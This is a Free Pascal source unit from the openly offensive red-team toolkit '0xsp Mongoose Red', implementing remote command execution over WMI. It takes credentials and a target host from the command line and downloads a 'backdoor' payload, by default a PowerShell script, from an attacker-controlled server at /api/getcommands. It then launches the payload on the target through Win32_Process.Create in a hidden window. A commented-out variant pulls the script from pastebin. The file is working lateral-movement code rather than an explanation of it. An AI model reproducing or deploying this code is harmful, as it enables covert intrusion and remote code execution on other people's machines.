{

/'\_/`\
|     |   _     ___     __     _      _     ___    __
| (_) | /'_`\ /' _ `\ /'_ `\ /'_`\  /'_`\ /',__) /'__`\
| | | |( (_) )| ( ) |( (_) |( (_) )( (_) )\__, \(  ___/
(_) (_)`\___/'(_) (_)`\__  |`\___/'`\___/'(____/`\____)
                     ( )_) |
                      \___/'    RED 2.1

 project : 0xsp Mongoose Red
 title :   WMI unit using OLE
 Author :  Lawrence Amer
 Site  :   https://0xsp.com

}
unit wmi;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils,comobj,activex,variants,core,wininet;




  const
  wbemFlagForwardOnly = $00000020;
  HIDDEN_WINDOW       = 0;

  procedure  GetWin32_ProcessInfo;

implementation


function GetScript(const Url: string): string;
var
  NetHandle: HINTERNET;
  UrlHandle: HINTERNET;
  Buffer: array[0..1023] of Byte;
  BytesRead: dWord;
  StrBuffer: UTF8String;
begin
  Result := '';
  BytesRead := Default(dWord);
  NetHandle := InternetOpen('Mozilla/5.0(compatible; WinInet)', INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);

  // NetHandle valid?
  if Assigned(NetHandle) then
    Try
      UrlHandle := InternetOpenUrl(NetHandle, PChar(Url), nil, 0, INTERNET_FLAG_RELOAD, 0);

      // UrlHandle valid?
      if Assigned(UrlHandle) then
        Try
          repeat
            InternetReadFile(UrlHandle, @Buffer, SizeOf(Buffer), BytesRead);
            SetString(StrBuffer, PAnsiChar(@Buffer[0]), BytesRead);
            Result := Result + StrBuffer;
          until BytesRead = 0;
        Finally
          InternetCloseHandle(UrlHandle);
        end
      // o/w UrlHandle invalid
      else
        writeln('Cannot open URL: ' + Url);
    Finally
      InternetCloseHandle(NetHandle);
    end
  // NetHandle invalid
  else
    raise Exception.Create('Unable to initialize WinInet');
end;


{ REVOKED
function getscript(url:string):string;    // get your script from remote web interface
var
  FPHTTPClient: TFPHTTPClient;
  Resultget : string;
begin
FPHTTPClient := TFPHTTPClient.Create(nil);
FPHTTPClient.AllowRedirect := True;
   try
   Resultget := FPHTTPClient.Get(url); // example https://pastebin.com/raw/wtf50XsX
   getscript := Resultget;
   Writeln('[+] Getting Shell....');
   except
      on E: exception do
         writeln(E.Message);
   end;
FPHTTPClient.Free;

end;
}


procedure  GetWin32_ProcessInfo;

var
  FSWbemLocator : OLEVariant;
  FWMIService   : OLEVariant;
  FWbemObjectSet: OLEVariant;
  FWbemObject   : OLEVariant;
  oEnum         : IEnumvariant;
  iValue        : LongWord;
  objProcess    : OLEVariant;
  objConfig     : OLEVariant;
  ProcessID     : Integer;
  backdoor : OLEVariant;
  username,password,host: OLEVariant;
  srvhost :string;
  i:integer;
  ssl_enabled : Boolean;
begin;
  ssl_enabled := false;
  for i := 1 to paramcount do begin

        if(paramstr(i)='-username') then begin
         username := paramstr(i+1);
         writeln('[+] using username : '+'['+username+']'+' to authenticate');
        end;
        if(paramstr(i)='-password') then begin
         password := paramstr(i+1);

        end;
         if(paramstr(i)='-host') then begin
         host := paramstr(i+1);
         writeln('[!] trying to connect to '+host);
        end;
         if (paramstr(i)='-srvhost') then begin
          srvhost := paramstr(i+1);
         end;
         if (paramstr(i)='-ssl') then begin
          writeln('SSL is Enabled ');
          ssl_enabled := true;
         end;
         end;
       // -u username
                          // -p password
                         // -r mongoose web api end point API  {scripting page }


  if (ssl_enabled) then
  backdoor := trim(GetScript('https://'+srvhost+DEF_PORT+'/api/getcommands')) // getting remote backdoor to be executed default will be powershell script
  else
  backdoor := trim(GetScript('http://'+srvhost+DEF_PORT+'/api/getcommands'));

  FSWbemLocator := CreateOleObject('WbemScripting.SWbemLocator');
  FWMIService   := FSWbemLocator.ConnectServer(host, 'root\CIMV2', username, password);
  FWbemObject   := FWMIService.Get('Win32_ProcessStartup');
  objConfig     := FWbemObject.SpawnInstance_;

  objConfig.ShowWindow := HIDDEN_WINDOW;
  objProcess    := FWMIService.Get('Win32_Process');
  objProcess.Create(backdoor, null, objConfig, ProcessID);
  Writeln(Format('Pid %d',[ProcessID]));
  writeln('[+] task has been created successfully  ..!');

  end;

end.

